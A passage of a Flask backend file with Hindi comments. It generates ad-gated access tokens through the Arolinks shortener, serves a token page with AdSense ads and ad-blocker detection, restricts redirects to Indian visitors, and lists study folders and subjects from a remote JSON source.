                "start_time": date_time_now_obj.strftime('%Y-%m-%d %H:%M:%S'),
                "expire_time": (date_time_now_obj + timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S'),
                "status": "active"
            }
            logger.debug(f"Triggering webhook for reused token. Payload: {webhook_payload}")
            send_webhook_to_server1(webhook_payload)
            
            logger.info("Returning response for reused token.")
            return jsonify({
                "status": "success",
                "url": entry["short_url"], # यह पुराना Arolinks URL ही रहेगा
                "message": "Reused expired key"
            }), 200

        # 3. नई की (Key) बनाना (सिंगल ट्रैकिंग सिस्टम के साथ - केवल Arolinks)
        logger.info("No expired token found for reuse. Generating a brand new key...")
        tracking_token = secrets.token_hex(16)
        final_token = secrets.token_hex(16)

        # --- Arolinks के लिए api=1 वाला ट्रैकिंग URL बनाना और शॉर्ट करना ---
        tracking_api_url_1 = f"https://study.edumate.life/app/?api=1&token={tracking_token}"
        aro_req_url = f"https://arolinks.com/api?api={FA_KEY}&url={quote(tracking_api_url_1)}&format=json"
        
        logger.info(f"Calling Arolinks API with api=1 tracking URL: {aro_req_url}")
        aro_response = requests.get(aro_req_url, headers={'User-Agent': 'Mozilla/5.0'})
        aro_json = aro_response.json()

        if aro_json.get('status') == 'success':
            aro_shortened_url = aro_json.get('shortenedUrl')
            logger.info(f"Successfully created Arolinks URL: {aro_shortened_url}")

            # डेटाबेस में सेव करना
            current_data[tracking_token] = {
                "ip": user_ip,
                "app_signature": app_signature,
                "created_at": date_time_now,
                "short_url": aro_shortened_url,             
                "tracking_url_1": tracking_api_url_1,       
                "final_token": final_token,
                "is_tracked_url1": False,                   # बायपास चेक के लिए फ्लैग
                "status": "active"
            }

            logger.info("Saving new token data to MongoDB...")
            collection.update_one({"_id": APP_DB_KEY}, {"$set": {"data": current_data}}, upsert=True)

            # वेबहुक ट्रिगर
            webhook_payload = {
                "auth_token": final_token,
                "app_signature": app_signature,
                "start_time": date_time_now_obj.strftime('%Y-%m-%d %H:%M:%S'),
                "expire_time": (date_time_now_obj + timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S'),
                "status": "active"
            }
            logger.debug(f"Triggering webhook for new token. Payload: {webhook_payload}")
            send_webhook_to_server1(webhook_payload)

            logger.info("Process complete. Returning new key response.")
            return jsonify({
                "status": "success",
                "url": aro_shortened_url, 
                "message": "Generated new key with single tracking check"
            }), 200
        else:
            error_msg = aro_json.get('message', 'Arolinks API Failure')
            logger.error(f"Arolinks API failed: {error_msg}")
            raise Exception(f"Arolinks Error: {error_msg}")

    except Exception as e:
        logger.exception(f"An unexpected error occurred in handler_app: {str(e)}")
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 200
"""


# अपना Arolinks API Key यहाँ सेट करना सुनिश्चित करें (यदि अलग फाइल में है तो इसे हटा दें)
# FA_KEY = "your_arolinks_api_key" 

@app.route('/auth-Key/generate-token/app/', methods=['GET', 'POST', 'OPTIONS'])
def handler_app():
    logger.info(f"Incoming {request.method} request to /auth-Key/generate-token/app/")
    
    if request.method == 'OPTIONS':
        return '', 200
        
    try:
        app_signature = request.headers.get('X-SN-Signature')
        if not app_signature:
            return jsonify({"status": "error", "message": "App Signature is missing"}), 400

        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'unknown')
        if ',' in user_ip:
            user_ip = user_ip.split(',')[0].strip()
            
        current_time = datetime.now().timestamp()
        
        logger.info(f"Fetching data from MongoDB for key: {APP_DB_KEY}")
        doc = collection.find_one({"_id": APP_DB_KEY})
        current_data = doc.get("data", {}) if doc else {}

        tz_kolkata = pytz.timezone('Asia/Kolkata')
        date_time_now_obj = datetime.now(tz_kolkata)
        date_time_now = date_time_now_obj.isoformat()
        
        # 10 दिन का फिक्स टाइम (28 जून 2026 से 8 जुलाई 2026 रात 11:59 तक)
        FIXED_START_DATE = tz_kolkata.localize(datetime(2026, 6, 28, 0, 0, 0))
        FIXED_EXPIRY_DATE = tz_kolkata.localize(datetime(2026, 7, 8, 23, 59, 59))
        
        # ---------------------------------------------------------
        # 1. नया सिस्टम (केवल 8 जुलाई 2026 तक चलेगा)
        # ---------------------------------------------------------
        if date_time_now_obj <= FIXED_EXPIRY_DATE:
            logger.info("Running 10-days fixed campaign logic (Valid till 8 July 2026)")
            
            # एक्टिव की (Key) चेक करना
            for token, entry in current_data.items():
                if entry.get("app_signature") == app_signature:
                    created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
                    if created_time >= FIXED_START_DATE.timestamp() and current_time < FIXED_EXPIRY_DATE.timestamp():
                        return jsonify({
                            "status": "success",
                            "url": entry.get("final_token", token), 
                            "message": "Active 10-days session found"
                        }), 200

            # पुरानी की (Key) रीयूज़ करना
            reused_token = None
            for token, entry in current_data.items():
                created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
                if created_time < FIXED_START_DATE.timestamp():
                    reused_token = token
                    break

            if reused_token:
                new_final_token = secrets.token_hex(16)
                entry = current_data[reused_token]
                entry.update({
                    "ip": user_ip, "app_signature": app_signature, 
                    "created_at": date_time_now, "status": "active", 
                    "final_token": new_final_token
                })
                if "is_tracked_url1" in entry: entry["is_tracked_url1"] = False
                
                collection.update_one({"_id": APP_DB_KEY}, {"$set": {"data": current_data}}, upsert=True)
                
                webhook_payload = {
                    "auth_token": new_final_token, "app_signature": app_signature,
                    "start_time": date_time_now_obj.strftime('%Y-%m-%d %H:%M:%S'),
                    "expire_time": FIXED_EXPIRY_DATE.strftime('%Y-%m-%d %H:%M:%S'),
                    "status": "active"
                }
                send_webhook_to_server1(webhook_payload)
                
                return jsonify({"status": "success", "url": new_final_token, "message": "Reused key for 10-days"}), 200

            # नई की (Key) बनाना
            tracking_token = secrets.token_hex(16) 
            final_token = secrets.token_hex(16)
            current_data[tracking_token] = {
                "ip": user_ip, "app_signature": app_signature, "created_at": date_time_now,
                "final_token": final_token, "is_tracked_url1": False, "status": "active"
            }
            collection.update_one({"_id": APP_DB_KEY}, {"$set": {"data": current_data}}, upsert=True)

            webhook_payload = {
                "auth_token": final_token, "app_signature": app_signature,
                "start_time": date_time_now_obj.strftime('%Y-%m-%d %H:%M:%S'),
                "expire_time": FIXED_EXPIRY_DATE.strftime('%Y-%m-%d %H:%M:%S'),
                "status": "active"
            }
            send_webhook_to_server1(webhook_payload)

            return jsonify({"status": "success", "url": final_token, "message": "Generated new 10-days key"}), 200

        # ---------------------------------------------------------
        # 2. पुराना सिस्टम (8 जुलाई 2026 के बाद अपने आप शुरू हो जाएगा)
        # ---------------------------------------------------------
        else:
            logger.info("Running regular 24-hours Arolinks logic (After 8 July 2026)")
            
            # 24 घंटे वाली एक्टिव की (Key) चेक करना
            for token, entry in current_data.items():
                if entry.get("app_signature") == app_signature:
                    created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
                    hours_diff = (current_time - created_time) / 3600
                    if hours_diff < 24:
                        return jsonify({
                            "status": "success",
                            "url": entry["short_url"],
                            "message": "Active 24-hour session found"
                        }), 200

            # एक्सपायर हो चुकी की (Key) रीयूज़ करना
            reused_token = None
            for token, entry in current_data.items():
                created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
                hours_diff = (current_time - created_time) / 3600
                if hours_diff >= 24:
                    reused_token = token
                    break

            if reused_token:
                new_final_token = secrets.token_hex(16)
                entry = current_data[reused_token]
                entry.update({
                    "ip": user_ip, "app_signature": app_signature, 
                    "created_at": date_time_now, "status": "active", 
                    "final_token": new_final_token
                })
                if "is_tracked_url1" in entry: entry["is_tracked_url1"] = False
                
                collection.update_one({"_id": APP_DB_KEY}, {"$set": {"data": current_data}}, upsert=True)
                
                webhook_payload = {
                    "auth_token": new_final_token, "app_signature": app_signature,
                    "start_time": date_time_now_obj.strftime('%Y-%m-%d %H:%M:%S'),
                    "expire_time": (date_time_now_obj + timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S'),
                    "status": "active"
                }
                send_webhook_to_server1(webhook_payload)
                
                # यहाँ Arolinks का पुराना URL ही वापस भेजा जाएगा
                return jsonify({"status": "success", "url": entry.get("short_url", ""), "message": "Reused expired key"}), 200

            # नई की (Key) बनाना (Arolinks के साथ)
            tracking_token = secrets.token_hex(16)
            final_token = secrets.token_hex(16)
            
            tracking_api_url_1 = f"https://study.edumate.life/app/?api=1&token={tracking_token}"
            aro_req_url = f"https://arolinks.com/api?api={FA_KEY}&url={quote(tracking_api_url_1)}&format=json"
            
            aro_response = requests.get(aro_req_url, headers={'User-Agent': 'Mozilla/5.0'})
            aro_json = aro_response.json()

            if aro_json.get('status') == 'success':
                aro_shortened_url = aro_json.get('shortenedUrl')
                current_data[tracking_token] = {
                    "ip": user_ip, "app_signature": app_signature, "created_at": date_time_now,
                    "short_url": aro_shortened_url, "tracking_url_1": tracking_api_url_1,       
                    "final_token": final_token, "is_tracked_url1": False, "status": "active"
                }
                collection.update_one({"_id": APP_DB_KEY}, {"$set": {"data": current_data}}, upsert=True)

                webhook_payload = {
                    "auth_token": final_token, "app_signature": app_signature,
                    "start_time": date_time_now_obj.strftime('%Y-%m-%d %H:%M:%S'),
                    "expire_time": (date_time_now_obj + timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S'),
                    "status": "active"
                }
                send_webhook_to_server1(webhook_payload)

                return jsonify({"status": "success", "url": aro_shortened_url, "message": "Generated new key (Arolinks)"}), 200
            else:
                raise Exception(f"Arolinks Error: {aro_json.get('message', 'Arolinks API Failure')}")

    except Exception as e:
        logger.exception(f"An unexpected error occurred: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 200

@app.route('/app/', methods=['GET', 'OPTIONS', 'POST', 'PUT', 'DELETE'])
def app_token_handler12():
    # --- 0. फालतू रिक्वेस्ट ब्लॉक करें (OPTIONS, HEAD आदि) ---
    if request.method == 'OPTIONS':
        resp = make_response('', 204)
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
        return resp
        
    if request.method != 'GET':
        return get_html_error_page("Method Not Allowed", "This endpoint only supports GET requests.", "🛑", 405)
        
    if 'favicon.ico' in request.path:
        return make_response('', 204)

    try:
        token = request.args.get('token')

        if not token:
            return get_html_error_page("Invalid Request", "Token is missing from the URL. Please check your link.", "❓", 400)

        # आज की तारीख निकालें (IST Timezone)
        tz_kolkata = pytz.timezone('Asia/Kolkata')
        d = datetime.now(tz_kolkata)
        today_date = d.strftime('%Y-%m-%d')

        cookie_header = request.headers.get("Cookie", "")
        has_today_cookie = f"visited_date={today_date}" in cookie_header

        # --- DB से वेरिफिकेशन ---
        DB_KEY = APP_DB_KEY
        doc = collection.find_one({"_id": DB_KEY})
        db_data = doc.get("data", {}) if doc else {}
        token_data = db_data.get(token)

        # 1. वैलिडिटी चेक: क्या टोकन मौजूद है?
        if not token_data:
            return get_html_error_page("Verification Failed", "Token is invalid. Please generate a new link.", "❌", 403)

        # 2. एक्सपायरेशन चेक: क्या टोकन 24 घंटे से पुराना है?
        created_time_str = token_data.get("created_at")
        if created_time_str:
            created_time = datetime.fromisoformat(created_time_str).timestamp()
            current_time = datetime.now().timestamp()
            hours_diff = (current_time - created_time) / 3600
            
            if hours_diff >= 24:
                return get_html_error_page("Token Expired", "Your access key has expired. Please generate a new one.", "⏳", 403)

        # --- स्क्रीन पर फाइनल टोकन दिखाने वाला HTML तैयार करें ---
        final_token = token_data.get("final_token", "Error: Token Not Found")
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Your Access Token</title>
            
            <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6225893138851886" crossorigin="anonymous"></script>
            
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap');
                body, html {{
                    margin: 0; padding: 0; width: 100%; min-height: 100vh; display: flex;
                    flex-direction: column; align-items: center; background: #0f172a;
                    font-family: 'Montserrat', sans-serif; overflow-x: hidden; overflow-y: auto;
                }}
                .blob {{ position: fixed; border-radius: 50%; filter: blur(60px); z-index: 0; animation: float 8s infinite ease-in-out alternate; }}
                .blob-1 {{ width: 300px; height: 300px; background: #3b82f6; top: -100px; left: -100px; }}
                .blob-2 {{ width: 250px; height: 250px; background: #8b5cf6; bottom: -50px; right: -50px; animation-delay: -4s; }}
                
                #main-wrapper {{
                    display: flex; flex-direction: column; align-items: center; width: 100%; z-index: 1; padding: 20px 0;
                }}

                .glass-container {{
                    background: rgba(255, 255, 255, 0.05);
                    backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
                    border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px;
                    padding: 40px 50px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
                    width: 90%; max-width: 400px; box-sizing: border-box; margin: 20px 0;
                }}
                
                .welcome-text {{ color: #ffffff; font-size: 24px; font-weight: 600; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; }}
                .sub-text {{ color: #10b981; font-size: 14px; letter-spacing: 1px; margin-bottom: 25px; }}
                
                .key-input {{
                    width: 100%; padding: 12px 15px; border-radius: 8px;
                    border: 1px solid rgba(255, 255, 255, 0.2); background: rgba(0, 0, 0, 0.3);
                    color: #fff; font-size: 16px; outline: none; box-sizing: border-box;
                    font-family: 'Montserrat', sans-serif; text-align: center; letter-spacing: 1px;
                }}
                
                .btn {{
                    width: 100%; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 600;
                    cursor: pointer; border: none; background: linear-gradient(90deg, #3b82f6, #8b5cf6);
                    color: white; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3); transition: all 0.3s ease;
                    font-family: 'Montserrat', sans-serif; margin-top: 15px;
                }}
                .btn:hover {{ opacity: 0.9; transform: translateY(-2px); }}
                
                /* Adblocker Overlay */
                #adblock-overlay {{
                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                    background: rgba(15, 23, 42, 0.95); z-index: 9999; display: none;
                    flex-direction: column; align-items: center; justify-content: center;
                    color: white; text-align: center; padding: 20px; box-sizing: border-box;
                }}
                #adblock-overlay h2 {{ color: #ef4444; font-size: 28px; margin-bottom: 10px; }}
                #adblock-overlay p {{ font-size: 16px; color: #cbd5e1; max-width: 400px; line-height: 1.5; }}
                
                @keyframes float {{
                    0% {{ transform: translate(0, 0) scale(1); }}
                    100% {{ transform: translate(30px, 50px) scale(1.1); }}
                }}
                
                .ad-container {{ width: 100%; max-width: 800px; padding: 10px; box-sizing: border-box; text-align: center; }}
            </style>
        </head>
        <body>
            <div class="blob blob-1"></div>
            <div class="blob blob-2"></div>
            
            <div id="adblock-overlay">
                <h2>Ad-Blocker Detected! 🛑</h2>
                <p>We rely on ads to keep this service running. Please disable your ad-blocker and refresh the page to see your token.</p>
                <button class="btn" style="max-width: 200px; margin-top: 20px;" onclick="location.reload()">I have disabled it</button>
            </div>

            <div id="main-wrapper">
                
                <div class="ad-container">
                    <ins class="adsbygoogle"
                         style="display:block"
                         data-ad-client="ca-pub-6225893138851886"
                         data-ad-slot="4878017615"
                         data-ad-format="auto"
                         data-full-width-responsive="true"></ins>
                    <script>
                         (adsbygoogle = window.adsbygoogle || []).push({{}});
                    </script>
                </div>

                <div class="glass-container">
                    <div class="welcome-text">Success ✅</div>
                    <div class="sub-text">Verification Complete.</div>
                    
                    <input type="text" id="token-input" class="key-input" value="{final_token}" readonly>
                    <button id="copy-btn" class="btn" onclick="copyToken()">Copy Key</button>
                </div>
                
                <div class="ad-container">
                    <ins class="adsbygoogle"
                         style="display:block"
                         data-ad-format="autorelaxed"
                         data-ad-client="ca-pub-6225893138851886"
                         data-ad-slot="8857212532"></ins>
                    <script>
                         (adsbygoogle = window.adsbygoogle || []).push({{}});
                    </script>
                </div>

            </div>

            <script>
                // Copy Token Function
                function copyToken() {{
                    var copyText = document.getElementById("token-input");
                    copyText.select();
                    copyText.setSelectionRange(0, 99999); 
                    navigator.clipboard.writeText(copyText.value).then(() => {{
                        var btn = document.getElementById("copy-btn");
                        btn.innerText = "Copied! ✅";
                        btn.style.background = "linear-gradient(90deg, #10b981, #059669)";
                        setTimeout(() => {{ 
                            btn.innerText = "Copy Key"; 
                            btn.style.background = "linear-gradient(90deg, #3b82f6, #8b5cf6)";
                        }}, 2500);
                    }});
                }}

                // Adblocker Detection Logic
                setTimeout(function() {{
                    // Create a fake ad banner
                    var adTest = document.createElement('div');
                    adTest.innerHTML = '&nbsp;';
                    adTest.className = 'adsbox';
                    adTest.style.position = 'absolute';
                    adTest.style.top = '-1000px';
                    document.body.appendChild(adTest);
                    
                    setTimeout(function() {{
                        // Check if the fake ad banner or window.adsbygoogle is blocked
                        var isBlocked = false;
                        if (adTest.offsetHeight === 0) {{
                            isBlocked = true;
                        }}
                        
                        adTest.remove(); // cleanup
                        
                        if (isBlocked) {{
                            document.getElementById('adblock-overlay').style.display = 'flex';
                            document.getElementById('main-wrapper').style.display = 'none';
                        }}
                    }}, 300);
                }}, 1500);
            </script>
        </body>
        </html>
        """

        response = make_response(html_content)

        # अगर आज की कुकी नहीं है तो उसे सेट करें
        if not has_today_cookie:
            response.set_cookie('visited_date', today_date, max_age=86400, path='/', httponly=True, samesite='Lax')

        return response

    except Exception as e:
        return get_html_error_page("Server Error", f"Something went wrong: {str(e)}", "⚙️", 500)

@app.route('/', methods=['GET', 'OPTIONS', 'POST', 'PUT', 'DELETE'])
def redirect_handler():
    # --- 0. फालतू रिक्वेस्ट ब्लॉक करें (OPTIONS, HEAD आदि) ---
    if request.method == 'OPTIONS':
        resp = make_response('', 204)
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'GET, OPTIONS'
        return resp
        
    if request.method != 'GET':
        return get_html_error_page("Method Not Allowed", "This endpoint only supports GET requests.", "🛑", 405)
        
    if 'favicon.ico' in request.path:
        return make_response('', 204)

    try:
        token = request.args.get('token')
        if not token:
            return get_html_error_page("Invalid Request", "Token is missing from the URL. Please check your link.", "❓", 400)

        # --- आईपी निकालने का लॉजिक (IPv4 को प्राथमिकता) ---
        cf_ip = request.headers.get("CF-Connecting-IP", "")
        xff_ips = request.headers.get("X-Forwarded-For", "")
        
        all_ips = []
        if cf_ip: 
            all_ips.append(cf_ip.strip())
        for ip in xff_ips.split(","):
            if ip.strip(): 
                all_ips.append(ip.strip())

        final_ip = "Unknown IP"
        ipv4 = next((ip for ip in all_ips if "." in ip), None) # पहले IPv4 ढूँढें
        ipv6 = next((ip for ip in all_ips if ":" in ip), None) # फिर IPv6 ढूँढें

        if ipv4:
            final_ip = ipv4
        elif ipv6:
            final_ip = ipv6

        # क्लाउडफ्लेयर हेडर से यूज़र का देश (Country) निकालना
        user_country = request.headers.get("CF-IPCountry", "XX")
        referer = request.headers.get("Referer", "")

        # आज की तारीख निकालें (IST Timezone)
        tz_kolkata = pytz.timezone('Asia/Kolkata')
        d = datetime.now(tz_kolkata)
        today_date = d.strftime('%Y-%m-%d')

        # कुकी चेक करें
        cookie_header = request.headers.get("Cookie", "")
        has_today_cookie = f"visited_date={today_date}" in cookie_header

        # --- स्टेप 1: इंडिया ट्रैफिक चेक ---
        if user_country != "IN" and final_ip != "Unknown IP":
            return get_html_error_page(
                "Access Restricted", 
                "It looks like you are using a VPN, Proxy. Please disable your VPN or Proxy connection and try again.", 
                "🌍🚫", 
                403
            )

        # --- स्टेप 2: रिफ़रर चेक ---
        is_valid_referer = False
        if referer:
            for allowed in ALLOWED_REFERERS:
                if allowed in referer:
                    is_valid_referer = True
                    break
                    
       # if not is_valid_referer:
          #  return get_html_error_page("Access Denied", "A bypass detected. Please use the original link.", "🛡️", 403)

        # --- स्टेप 3: DB से वेरिफिकेशन (सीधे MongoDB से) ---
        DB_KEY = "tokens_data"
        doc = collection.find_one({"_id": DB_KEY})
        db_data = doc.get("data", {}) if doc else {}
        token_data = db_data.get(token)

        # आईपी मैच चेक
        ip_matches = False
        if token_data and token_data.get("ip"):
            ip_matches = token_data["ip"] in all_ips

        redirect_url = ""
        if not token_data or not ip_matches:
            fallback_url = token_data.get("main_url") if token_data and token_data.get("main_url") else "https://your-default-fallback.com"
            redirect_url = generate_fallback_link(fallback_url, FALLBACK_SHORTENER_API_URL, FALLBACK_SHORTENER_API_KEY)
        else:
            redirect_url = token_data["main_url"]

        # --- स्टेप 4: रिडायरेक्ट रिस्पॉन्स तैयार करें और कुकी सेट करें ---
        response = make_response(redirect(redirect_url, code=302))

        # अगर आज की कुकी नहीं है तो उसे सेट करें
        if not has_today_cookie:
            response.set_cookie('visited_date', today_date, max_age=86400, path='/', httponly=True, samesite='Lax')

        return response

    except Exception as e:
        return get_html_error_page("Server Error", "Something went wrong. Please try again later.", "⚙️", 500)



def get_html_error_page(title, message, icon="⚠️", status_code=400):
    """
    सभी प्रकार के एरर को सुंदर HTML फॉर्मेट में दिखाने के लिए डायनेमिक फंक्शन।
    """
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{title}</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }}
            .container {{ background-color: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 500px; width: 90%; }}
            .icon {{ font-size: 60px; color: #dc3545; margin-bottom: 20px; }}
            h1 {{ font-size: 24px; margin-bottom: 15px; color: #212529; }}
            p {{ font-size: 16px; line-height: 1.5; color: #6c757d; margin-bottom: 25px; }}
            .btn {{ background-color: #0d6efd; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; text-decoration: none; transition: background-color 0.3s; display: inline-block; }}
            .btn:hover {{ background-color: #0b5ed7; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">{icon}</div>
            <h1>{title}</h1>
            <p>{message}</p>
            <button class="btn" onclick="window.location.reload();">Try Again</button>
        </div>
    </body>
    </html>
    """
    resp = make_response(html, status_code)
    resp.headers['Content-Type'] = 'text/html;charset=UTF-8'
    return resp


def generate_fallback_link(destination_url, api_url, api_key):
    try:
        encoded_url = quote(destination_url)
        request_url = f"{api_url}?api={api_key}&url={encoded_url}&format=json"
        
        response = requests.get(request_url)
        data = response.json()
        
        if data and data.get('status') == 'success' and data.get('shortenedUrl'):
            return data['shortenedUrl']
        return destination_url
    except Exception:
        return destination_url


# जहाँ से मेन JSON डेटा लेना है
DATA_URL = "https://botbuilder-6861.onrender.com/get-file/bot_data.json"

def find_folder(current_node, target_id):
    """
    JSON डेटा के अंदर गहराई तक जाकर सही folder_id को खोजने वाला फंक्शन
    """
    if current_node.get("id") == target_id:
        return current_node
    
    # अगर यह फ़ोल्डर नहीं है, तो इसके अंदर खोजने की ज़रूरत नहीं है
    for item in current_node.get("items", []):
        if item.get("type") == "folder":
            result = find_folder(item, target_id)
            if result:
                return result
                
    return None
@app.route('/api/folders', methods=['GET'])
def get_folders():
    # फ्रंटएंड से folder_id प्राप्त करें, अगर न हो तो 'root' मान लें
    folder_id = request.args.get('folder_id', 'root')
    
    try:
        # बाहरी URL से डेटा लाएँ
        resp = requests.get(DATA_URL)
        raw_data = resp.json()
    except Exception as e:
        return jsonify({"error": "Failed to fetch data from source"}), 500
        
    root_node = raw_data.get("data", {})
    
    # माँगा गया फ़ोल्डर खोजें
    target_folder = find_folder(root_node, folder_id)
    
    # अगर फ़ोल्डर ही नहीं मिला, तो 205 स्टेटस भेजें
    if not target_folder:
        return Response(status=205)
        
    output_data = []
    
    # 1. अगर फ़ोल्डर का कोई डिस्क्रिप्शन है, तो उसे 'description' टाइप के रूप में सबसे ऊपर जोड़ें
    if target_folder.get("description"):
        output_data.append({
            "id": f"desc_{folder_id}",
            "name": f"About {target_folder.get('name', 'This Section')}",
            "type": "description",
            "details": target_folder.get("description")
        })
        
    # 2. अब फ़ोल्डर के अंदर के आइटम्स को प्रोसेस करें (केवल file और folder)
    valid_items_count = 0
    for item in target_folder.get("items", []):
        item_type = item.get("type")
        item_id = item.get("id")
        
        # सिर्फ 'folder' और 'file' को ही अनुमति दें
        if item_type in ["folder", "file"]:
            valid_items_count += 1
            
            # डिटेल्स सेट करें (अगर डिस्क्रिप्शन है तो वो, वरना डिफ़ॉल्ट)
            details = item.get("description")
            if not details:
                if item_type == "folder":
                    inner_items = len(item.get("items", []))
                    details = f"{inner_items} Items inside"
                else:
                    details = item.get("caption", "Document")
                    
            if item_type == "file":
                file_url = item.get("file_url")
                
                # फाइल का बेसिक डेटा
                file_data = {
                    "id": item_id,
                    "name": item.get("name", "Unnamed"),
                    "type": item_type,
                    "details": details
                }
                
                # अगर file_url है (खाली नहीं है), तो उसे सेट करें
                if file_url:
                    file_data["fileUrl"] = file_url
                else:
                    # अगर file_url नहीं है, तो open_url जनरेट करें
                    file_data["fileUrl"] = ""
                    file_data["open_url"] = f"https://t.me/Rajasthan_UniversityBot?start={item_id}"
                    
                output_data.append(file_data)
                
            else:
                output_data.append({
                    "id": item_id,
                    "name": item.get("name", "Unnamed"),
                    "type": item_type,
                    "details": details                
                })
                    
    # अगर फ़ोल्डर में कोई डिस्क्रिप्शन भी नहीं है और कोई file/folder भी नहीं है, तो 205 भेजें
    if valid_items_count == 0 and not target_folder.get("description"):
        return Response(status=205)
        
    return jsonify(output_data)

"""
@app.route('/api/folders', methods=['GET'])
def get_folders():
    # फ्रंटएंड से folder_id प्राप्त करें, अगर न हो तो 'root' मान लें
    folder_id = request.args.get('folder_id', 'root')
    
    try:
        # बाहरी URL से डेटा लाएँ
        resp = requests.get(DATA_URL)
        raw_data = resp.json()
    except Exception as e:
        return jsonify({"error": "Failed to fetch data from source"}), 500
        
    root_node = raw_data.get("data", {})
    
    # माँगा गया फ़ोल्डर खोजें
    target_folder = find_folder(root_node, folder_id)
    
    # अगर फ़ोल्डर ही नहीं मिला, तो 205 स्टेटस भेजें
    if not target_folder:
        return Response(status=205)
        
    output_data = []
    
    # 1. अगर फ़ोल्डर का कोई डिस्क्रिप्शन है, तो उसे 'description' टाइप के रूप में सबसे ऊपर जोड़ें
    if target_folder.get("description"):
        output_data.append({
            "id": f"desc_{folder_id}",
            "name": f"About {target_folder.get('name', 'This Section')}",
            "type": "description",
            "details": target_folder.get("description")
        })
        
    # 2. अब फ़ोल्डर के अंदर के आइटम्स को प्रोसेस करें (केवल file और folder)
    valid_items_count = 0
    for item in target_folder.get("items", []):
        item_type = item.get("type")
        
        # सिर्फ 'folder' और 'file' को ही अनुमति दें
        if item_type in ["folder", "file"]:
            valid_items_count += 1
            
            # डिटेल्स सेट करें (अगर डिस्क्रिप्शन है तो वो, वरना डिफ़ॉल्ट)
            details = item.get("description")
            if not details:
                if item_type == "folder":
                    inner_items = len(item.get("items", []))
                    details = f"{inner_items} Items inside"
                else:
                    details = item.get("caption", "Document")
            if item_type == "file":
                fileUrl =  item.get("file_url", "https://freetestdata.com/wp-content/uploads/2025/04/15-MB.pdf")
                output_data.append({
                "id": item.get("id"),
                "name": item.get("name", "Unnamed"),
                "type": item_type,
                "details": details,
                "fileUrl" : fileUrl
            })
            else:
                output_data.append({
                "id": item.get("id"),
                "name": item.get("name", "Unnamed"),
                "type": item_type,
                "details": details                
            })
                    
            
            
    # अगर फ़ोल्डर में कोई डिस्क्रिप्शन भी नहीं है और कोई file/folder भी नहीं है, तो 205 भेजें
    if valid_items_count == 0 and not target_folder.get("description"):
        return Response(status=205)
        
    return jsonify(output_data)
"""

@app.route('/api/subjects', methods=['GET'])
def get_subjects():
    # डिफ़ॉल्ट रूप से 'root' फ़ोल्डर को पैरेंट मानेंगे, आप इसे URL से बदल भी सकते हैं
    parent_id = request.args.get('parent_id', 'root')
    
    try:
        resp = requests.get(DATA_URL)
        raw_data = resp.json()
    except Exception as e:
        return jsonify({"error": "Failed to fetch data from source"}), 500
        
    root_node = raw_data.get("data", {})
    target_folder = find_folder(root_node, parent_id)
    
    if not target_folder:
        return Response(status=205)
        
    subjects_data = []
    
    for item in target_folder.get("items", []):
        # हम मान रहे हैं कि Subjects फ़ोल्डर के रूप में हैं
        if item.get("type") == "folder":
            subject_name = item.get("name", "Unknown")
            
            # 1. नाम के पहले 3 अक्षर निकालना (बड़े अक्षरों में)
            # अगर नाम 3 अक्षरों से छोटा है तो 'X' जोड़ देंगे (जैसे IT -> ITX)
            prefix = subject_name[:3].upper() if len(subject_name) >= 3 else subject_name.upper().ljust(3, 'X')
            
            # 2. 100-110 और 200-210 के बीच का रैंडम नंबर जनरेट करना
            possible_numbers = list(range(100, 111)) + list(range(200, 211))
            random_num = random.choice(possible_numbers)
            
            # 3. सब्जेक्ट कोड बनाना
            subject_code = f"{prefix}-{random_num}"
            
            subjects_data.append({
                "subject_id": item.get("id"),
                "subject_name": subject_name,
                "subject_code": subject_code,
                "image_url": "https://study.lnkz.tech/default.png"
            })
            
    # अगर उस फ़ोल्डर में कोई विषय नहीं मिला तो 205 स्टेटस भेजें
    if not subjects_data:
        return Response(status=205)
        
    return jsonify(subjects_data)
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
